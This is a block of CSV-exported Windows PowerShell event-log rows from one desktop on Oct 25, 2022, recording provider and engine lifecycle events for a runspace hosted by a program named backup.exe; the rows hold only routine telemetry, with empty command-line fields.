+24,"Oct 25, 2022 @ 04:27:00.436",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,13,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,Certificate,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,332.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+25,"Oct 25, 2022 @ 04:27:00.436",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,15,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,WSMan,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,333.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+26,"Oct 25, 2022 @ 04:27:00.436",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,17,start,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=2a04aee9-5f9b-4c5b-82d7-5d1e91a47c18
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,Available,None,5.1.19041.1237,-,-,-,-,0.5.0.27,-,-,2a04aee9-5f9b-4c5b-82d7-5d1e91a47c18,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400.0,-,-,Info,-,-,-,PowerShell,334.0,Engine Lifecycle,-,-,-,-,-,-,-,-
+27,"Oct 25, 2022 @ 04:27:00.420",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,Registry,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,326.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+28,"Oct 25, 2022 @ 04:27:00.420",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,Alias,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,327.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+29,"Oct 25, 2022 @ 04:27:00.420",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,Environment,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,328.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+30,"Oct 25, 2022 @ 04:27:00.420",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=06c1e9c3-b8ab-453b-90d5-79b85bfa62fb
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,0.5.0.27,FileSystem,Started,-,-,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,06c1e9c3-b8ab-453b-90d5-79b85bfa62fb,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,329.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+31,"Oct 25, 2022 @ 04:25:35.170",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,21,end,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=21
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=53d1e0af-cbbb-4fa3-9f4a-381685e44bc5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Stopped,Available,5.1.19041.1237,0.5.0.27,-,-,53d1e0af-cbbb-4fa3-9f4a-381685e44bc5,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,-,-,Info,-,-,-,PowerShell,325,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+32,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Registry,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,316,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+33,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Alias,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,317,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+34,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Environment,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,318,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+35,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,FileSystem,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,319,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+36,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Function,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,320,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+37,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Variable,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,321,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+38,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,13,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Certificate,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,322,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
